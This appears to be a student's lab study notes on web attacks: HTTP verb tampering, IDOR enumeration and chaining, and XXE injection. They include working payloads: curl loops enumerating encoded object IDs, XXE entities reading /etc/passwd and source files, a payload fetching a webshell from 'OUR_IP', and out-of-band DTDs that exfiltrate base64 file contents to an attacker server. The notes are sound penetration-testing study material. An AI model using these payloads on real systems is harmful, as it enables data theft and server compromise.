#webattacks
- Most common type of attack
- HTTP Verb Tampering
	- [WSTG - v4.1 | OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)
	-  exploits web servers that accept many HTTP verbs and methods
	- Authorization Bypass
		- find pages that require/prompt for authorization
		- Test out various VERBS and see which ones do not return auth requests or denies
		- May not return data but may cause a function of the application to run
	- Security Filters bypass
		- Code may look for POST or sanitize POST but fails to handle GET or other verbs, correctly
		- Find all inputs that filter payloads
		- Attempt different VERBs on each input and verify payload results
- Insecure Direct Object References (IDOR)
	- [WSTG - Latest | OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
	- application provides direct access to objects based on user-supplied input, such as files
	- unauthorized access to resources
	- Identify
		- Find Direct Object References (think URL parameters)
		- Change a reference to see if one is accessible when it shouldn't
		- Check encoding, might be able to decode, alter parameter, and reencode
		- Parameters may be hashed with weak hashing (md5) which could be cracked, altered, then rehashed
		- Hidden AJAX calls
		- Different user roles may show different parameters
	- Mass IDOR Enumeration
		- When the vuln parameter can support fuzzing
		- Must use automation
			- burp
			- fuff
			- scripts
		- 
	- Bypassing Encoding
	- Insecure APIs
	- Chaining IDORs
- XML External Entity (XXE) Injection
	- [XML External Entity (XXE) Processing | OWASP Foundation](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing)
	-  malicious XML data to disclose local files stored on the back-end server
	- Local File Disclosure
	- Advanced File Disclosure
	- Blind Data Exfiltration


- Bypassing Encoding References
	- may be hashed like md5
		- `for i in {1..10}; do echo -n $i | md5sum | awk '{print $1}'; done`
	- may be encoded like b64
		- `for i in {1..20}; do echo -n $i | base64 -w 0; echo; done`
	- could be a chained combination of each
	- Dev may make a mistake in framework such as Angular, React, or Vue
	- Example of payload chaining
	```bash
	#!/bin/bash
	
	for i in {1..10}; do
		for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
			curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
		done
	done
	```

> Iterate 1-10 b64 encode then md5 hash payload, send with a POST
	- Post processing of the results may be needed, i.e. the results might have its own hashing or encoding
> [!details]+ Bash Script: Download Contracts
> ```bash
> #!/bin/bash
> 
> output_file="contracts_text.txt"
> > "$output_file"
> 
> for i in {1..20}; do
>     b64=$(echo -n "$i" | base64)
>     url_encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$b64'''))")
> 
>     response_headers=$(mktemp)
>     curl --path-as-is -s -k -D "$response_headers" -o "temp.pdf" \
>         "http://83.136.255.244:51006/download.php?contract=$url_encoded"
> 
>     filename=$(grep -i 'Content-Disposition' "$response_headers" | sed -n 's/.*filename=\"\\([^\"]*\\)\".*/\\1/p')
> 
>     if [[ -n "$filename" ]]; then
>         mv temp.pdf "$filename"
>         echo "[+] Saved $filename"
>         cat "$filename" >> "$output_file"
>         echo -e "\\n--- END OF CONTRACT $i ---\\n" >> "$output_file"
>         rm "$filename"
>     else
>         echo "[-] Failed to get filename for contract $i"
>         rm temp.pdf
>     fi
> 
>     rm "$response_headers"
> done
> 
> echo "[✓] All contracts processed. Text saved to $output_file"
> ```

- IDOR in Insecure API
	- IDOR (Insecure Direct Object Reference) in APIs allows attackers to manipulate identifiers (like uid, uuid) to access or modify data they shouldn't.
	- Goes beyond reading data — can include function calls like updating profiles, changing roles, or deleting users.
	- Information Disclosure
		- Exploiting GET requests to read other users' data.
		- Example: GET /profile/api.php/profile/2
	- Insecure Function Calls
		- Exploiting PUT/POST/DELETE to perform actions as another user.
		- Example: PUT /profile/api.php/profile/2 with modified uid, uuid, or role.
	- testing for IDOR
		- Intercept API requests (e.g., with Burp Suite).
		- Modify parameters like:
			- uid, uuid
			- role
		- Change endpoint paths (e.g., /profile/1 → /profile/2).
		- Try different HTTP methods: GET, PUT, POST, DELETE.
	- 🚨 Common Weaknesses
		- Client-side role control (e.g., role=employee in cookies).
		- No server-side validation of uid, uuid, or role.
		- Error messages (e.g., uid mismatch, uuid mismatch) can leak logic.
- Chaining IDOR Vulnerabilities
	- IDOR in APIs lets attackers manipulate identifiers to access or modify data they shouldn't. This includes reading data (information disclosure) and performing actions (insecure function calls).
	- To test for IDOR:
		- Intercept API requests.
		- Modify parameters like uid, uuid, or role.
		- Try different HTTP methods (GET, PUT, POST, DELETE).
	- Common weaknesses:
		- Role or user ID stored in cookies or JSON.
		- No server-side validation.
	-Example
		- GET requests with another uid returned full user details (information disclosure).
		- Using the leaked uuid, a PUT request could modify another user's profile (insecure function call).
		- Changing the role to web_admin worked, showing no backend validation.
		- With admin role, user could create/delete users or mass update fields like email or about.
	- Chaining IDORs:
		- Use GET to enumerate users and find an admin.
		- Use PUT to change your role to admin.
		- Use POST to create users or inject XSS.
- XXE XML External Entity (XXE) Injection
	-  XML data is taken from a user-controlled input without properly sanitizing or safely parsing it
	-  disclosing sensitive files to shutting the back-end server down
> [!details]+ XML Example
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <email>
>   <date>01-01-2022</date>
>   <time>10:00 am UTC</time>
>   <sender>john@inlanefreight.com</sender>
>   <recipients>
>     <to>HR@inlanefreight.com</to>
>     <cc>
>         <to>billing@inlanefreight.com</to>
>         <to>payslips@inlanefreight.com</to>
>     </cc>
>   </recipients>
>   <body>
>   Hello,
>       Kindly share with me the invoice for the payment made on January 1, 2022.
>   Regards,
>   John
>   </body> 
> </email>
> ```

| Key           | Definition                                                                                                    | Example                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The keys of an XML document, usually wrapped with (`<`/`>`) characters.                                       | `<date>`                                 |
| `Entity`      | XML variables, usually wrapped with (`&`/`;`) characters.                                                     | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure
> [!details]+ XML DTD Example
> ```xml
> <!DOCTYPE email [
>   <!ELEMENT email (date, time, sender, recipients, body)>
>   <!ELEMENT recipients (to, cc?)>
>   <!ELEMENT cc (to*)>
>   <!ELEMENT date (#PCDATA)>
>   <!ELEMENT time (#PCDATA)>
>   <!ELEMENT sender (#PCDATA)>
>   <!ELEMENT to  (#PCDATA)>
>   <!ELEMENT body (#PCDATA)>
> ]>
> ```

- XML Entities - XML Variables
	- Keyword `ENTITY`
	- Reference in XML by `&` and `;`, such as `&payload;`
	- Reference is replaced by variable value
	- can reference external XML Entitites with SYSTM keyword

> [!details]+ External XML Entity reference
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE email [
>   <!ENTITY company SYSTEM "http://localhost/company.txt">
>   <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
> ]>
> ```

- Local File Disclosure
	- Using XXE vulns to get local data
	- Example: XML document has a tag 'email'
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [
	<!ENTITY company "Inlane Freight">
	]>
	```
	
> Define XML entity

> [!details]+ External XXE Payload
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE email [
> <!ENTITY company SYSTEM "{INSERT PAYLOAD HERE}">
> ]>
> <root>
> <name>test</name>
> <tel>teste</tel>
> <email>&company;</email>
> <message>test</message>
> </root>
> ```


> call `company` in the `email` tag

- payload examples

	- `<!ENTITY company "XXE TEST">`

> Look for 'XXE Test' in the response

	- `<!ENTITY company SYSTEM "file:///etc/passwd">`

> Look for '/etc/passwd' contents in the response

`<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">`

> Look for 'B64' of the file in the response

`<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`

> Include a webshell in the response

- Advanced File Disclosure
- Some payloads may break XML parsing, use CDATA as a work around
- Use XML Parameter Entities to allow mixing entities
- Example flow

```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

> - Create DTD to access remotely
> - Set up local web server to serve DTD file

> [!details]+ XML sent to target
> ```xml
> <!DOCTYPE email [
>   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
>   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
>   <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
>   <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
>   %xxe;
> ]>

> This will request the DTD hosted on attacker, then target will parse it

- Error Based XXE
- Try inducing errors withing XML
- Create a DTD that will be parsed on error
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
> XXE.dtd

- Add entity to request
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
> Response error will trigger call to external XXE.dtd

- Blind Data Exfiltration
	- Cannot see any data in responses
	- Use Out of Band Data Exfiltration
	- host xxe.dtd for the system to access
	- application will then parse xxe.dtd
	- application will then reach out to the local server with a b64 request
	- decode for the actual data

> [!details]+ xxe.dtd
> ```xml
> <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
> <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
> ```

> [!details]+ index.php
> ```php
> <?php
> if(isset($_GET['content'])){
>     error_log("\n\n" . base64_decode($_GET['content']));
> }
> ?>
> ```

> [!details]+ request payload
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE email [ 
>   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
>   %remote;
>   %oob;
> ]>
> <root>&content;</root>
> ```


- [[XXEinjector]]
	- XXE exploit automation